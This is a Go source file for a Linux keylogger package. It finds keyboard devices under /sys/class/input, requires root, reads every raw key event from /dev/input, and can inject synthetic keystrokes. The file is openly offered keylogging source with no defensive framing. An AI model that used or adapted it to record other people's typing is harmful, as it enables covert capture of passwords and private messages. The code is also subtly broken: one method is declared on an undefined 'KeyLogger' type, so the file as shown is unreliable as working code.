package keylogger

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"syscall"
)

// Keylogger struct
type Keylogger struct {
	file *os.File
}

type devices []string

func (d *devices) hasDevice(str string) bool {
	for _, device := range *d {
		if strings.Contains(str, device) {
			return true
		}
	}
	return false
}

var restrictedDevices = devices{"mouse", "mice", "touchpad", "wacom", "joy", "gamepad", "tablet", "touchscreen", "stylus", "digitizer"}
var allowedDevices = devices{"keyboard", "kbd", "keypad", "evdev", "logitech mx keys"}

func New(devPath string) (*Keylogger, error) {
	k := &Keylogger{}
	if !k.IsRoot() {
		return nil, errors.New("You need to be root to run this program")
	}
	file, err := os.OpenFile(devPath, os.O_RDWR, os.ModeCharDevice)
	k.file = file
	return k, err
}

func FindKeyboardDevice() string {
	path := "/sys/class/input/event%d/device/name"
	resolved := "/dev/input/event%d"

	for i := 0; i < 255; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(path, i))
		if err != nil {
			continue
		}

		deviceName := strings.ToLower(string(buff))

		if restrictedDevices.hasDevice(deviceName) {
			continue
		} else if allowedDevices.hasDevice(deviceName) {
			return fmt.Sprintf(resolved, i)
		}
	}
	return ""
}

func FindAllKeyboardDevices() []string {
	path := "/sys/class/input/event%d/device/name"
	resolved := "/dev/input/event%d"

	valid := make([]string, 0)

	for i := 0; i < 255; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(path, i))

		if os.IsNotExist(err) {
			break
		}
		if err != nil {
			continue
		}

		deviceName := strings.ToLower(string(buff))

		if restrictedDevices.hasDevice(deviceName) {
			continue
		} else if allowedDevices.hasDevice(deviceName) {
			valid = append(valid, fmt.Sprintf(resolved, i))
		}
	}
	return valid
}

func (k *Keylogger) IsRoot() bool {
	return syscall.Getuid() == 0 && syscall.Geteuid() == 0
}

func (k *Keylogger) Read() chan InputEvent {
	event := make(chan InputEvent)
	go func(event chan InputEvent) {
		for {
			e, err := k.read()
			if err != nil {
				close(event)
				break
			}
			if e != nil {
				event <- *e
			}
		}
	}(event)
	return event
}

func (k *Keylogger) Write(direction KeyEvent, key string) error {
	key = strings.ToUpper(key)
	code := uint16(0)
	for c, k := range keyCodeMap {
		if k == key {
			code = c
		}
	}
	if code == 0 {
		return fmt.Errorf("Key %s not found", key)
	}
	err := k.write(InputEvent{
		Type:  EvKey,
		Code:  code,
		Value: int32(direction),
	})
	if err != nil {
		return err
	}
	return k.syn()
}

func (k *KeyLogger) WriteOnce(key string) error {
	key = strings.ToUpper(key)
	code := uint16(0)
	for c, k := range keyCodeMap {
		if k == key {
			code = c
		}
	}
	if code == 0 {
		return fmt.Errorf("%s key not found in key code map", key)
	}

	for _, i := range []int32{int32(KeyPress), int32(KeyRelease)} {
		err := k.write(InputEvent{
			Type:  EvKey,
			Code:  code,
			Value: i,
		})
		if err != nil {
			return err
		}
	}
	return k.syn()
}

func (k *Keylogger) read() (*InputEvent, error) {
	buffer := make([]byte, eventsize)
	n, err := k.file.Read(buffer)
	if err != nil {
		return nil, err
	}
	if n <= 0 {
		return nil, nil
	}
	return k.eventFromBuffer(buffer)
}

func (k *Keylogger) write(event InputEvent) error {
	return binary.Write(k.file, binary.LittleEndian, event)
}

func (k *Keylogger) syn() error {
	return binary.Write(k.file, binary.LittleEndian, InputEvent{
		Type:  EvSyn,
		Code:  0,
		Value: 0,
	})
}

func (k *Keylogger) eventFromBuffer(buffer []byte) (*InputEvent, error) {
	event := &InputEvent{}
	err := binary.Read(bytes.NewBuffer(buffer), binary.LittleEndian, event)
	return event, err
}

func (k *Keylogger) Close() error {
	if k.file == nil {
		return nil
	}
	return k.file.Close()
}
